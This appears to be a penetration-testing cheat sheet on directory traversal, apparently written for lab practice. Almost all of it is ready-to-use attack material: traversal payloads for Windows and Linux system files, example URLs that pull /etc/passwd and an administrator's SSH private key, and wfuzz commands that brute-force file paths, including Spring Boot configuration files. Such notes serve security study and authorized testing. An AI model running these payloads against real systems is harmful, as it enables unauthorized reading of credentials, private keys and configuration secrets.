# **Directory Traversal**

Test for directory traversal attacks whenever you find user-controllable inputs that influence file access, especially in URL parameters or form inputs that specify files or directories.

#### **Payload**
##### **Windows:**
```
../../../../../../../windows/win.ini
../../../../../../../windows/boot.ini
../../../../../../../windows/system32/drivers/etc/hosts
```
##### **Linux:**
```
../../../../../../../etc/passwd
```

**Examples**
```
http://192.168.118.126/siteadmin/dev?piano_f=../../../../../etc/passwd

http://192.168.118.126/siteadmin/dev?piano_f=../../../../../home/admin/.ssh/id_rsa
```

```
http://192.168.118.126/siteadmin/dev?piano_f=../../../../../home/admin/proof.txt
```

```
http://192.168.118.126/app/specials?menu=../../../../../../../windows/win.ini
```

#### **Fuzzing default file paths**
-c: display color in terminal output        
-z: payload parameter
```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.145.101/relativePathingVerbose.php?path=../../../../../../../../../../../../../../FUZZ
```

--hh : suppress the erroneous response sizes        
--hc 404: filters the web resources unknown by the web server       


```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://192.168.145.101/relativePathing.php?path=../../../../../../../../../../../../FUZZ
```



#### **Fuzzing Application specific file paths**
**Example - Spring Boot**
- Create paths.txt
```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

- Create files.txt
```
application.properties
application.yml
config/application.properties
config/application.yml
```

- Now run Wfuzz with our word lists.
``` 
wfuzz -w paths.txt -w files.txt --hh 0 http://192.168.248.131/specials?menu=FUZZFUZ2Z